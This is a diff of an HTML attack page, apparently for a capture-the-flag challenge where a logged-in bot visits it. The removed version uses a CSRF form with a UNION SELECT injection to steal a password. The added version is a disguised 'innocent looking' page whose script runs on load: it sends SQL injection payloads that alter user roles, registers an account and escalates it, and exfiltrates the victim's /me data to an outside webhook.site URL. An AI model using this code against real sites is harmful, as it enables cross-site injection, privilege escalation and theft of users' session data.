@@ -1,24 +1,84 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Malicious Page</title>
+</head>
 <body>
-  <form action="http://localhost:3000/debug/create_log" method="POST" target="_blank">
-    <input type="hidden" name="log" value="' UNION SELECT password FROM users --">
-    <input type="submit" value="Get Superbot Password">
-  </form>
-  
-  <script>
-    // Alternatively, use fetch API
-    function exploit() {
-      fetch('http://localhost:3000/debug/create_log', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: 'log=' + encodeURIComponent("' UNION SELECT password FROM users WHERE username='superbot' --")
-      });
-    }
-    exploit();
-    document.forms[0].submit;
-  </script>
+    <h1>Innocent Looking Page</h1>
+    <p>This page looks normal but contains malicious JavaScript.</p>
+    
+    <script>
+        // This script will run when the bot visits the page
+        // The bot is logged in with user privileges
+        
+        // Option 1: Try to make a request to the vulnerable endpoint
+        function exploitSQLInjection() {
+            const payload = "');UPDATE users SET role='user' WHERE username='[YOUR_USERNAME]';/*";
+            
+            fetch('/debug/create_log', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'log=' + encodeURIComponent(payload),
+                credentials: 'include'
+            }).then(response => {
+                console.log('SQL injection attempt completed');
+            }).catch(error => {
+                console.error('Error:', error);
+            });
+        }
+        
+        // Option 2: Exfiltrate session data
+        function exfiltrateSession() {
+            // Send current user info to our external server
+            fetch('/me', {
+                credentials: 'include'
+            }).then(response => response.json())
+            .then(data => {
+                // Send the user data to our external server
+                fetch('https://webhook.site/af720e13-405d-440f-8f77-30b72ada354f', {
+                    method: 'POST',
+                    body: JSON.stringify(data),
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+            });
+        }
+        
+        // Option 3: Create a new user with user role (if possible)
+        function createPrivilegedUser() {
+            const newUsername = 'hacked_user_' + Math.random().toString(36).substr(2, 9);
+            const password = 'password123';
+            
+            fetch('/register', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `username=${newUsername}&password=${password}`,
+                credentials: 'include'
+            }).then(() => {
+                // After creating user, try to upgrade their role
+                const sqlPayload = "');UPDATE users SET role='user' WHERE username='" + newUsername + "';/*";
+                return fetch('/debug/create_log', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: 'log=' + encodeURIComponent(sqlPayload),
+                    credentials: 'include'
+                });
+            });
+        }
+        
+        // Execute the attack
+        setTimeout(() => {
+            exploitSQLInjection();
+            exfiltrateSession();
+            createPrivilegedUser();
+        }, 1000);
+    </script>
 </body>
 </html>
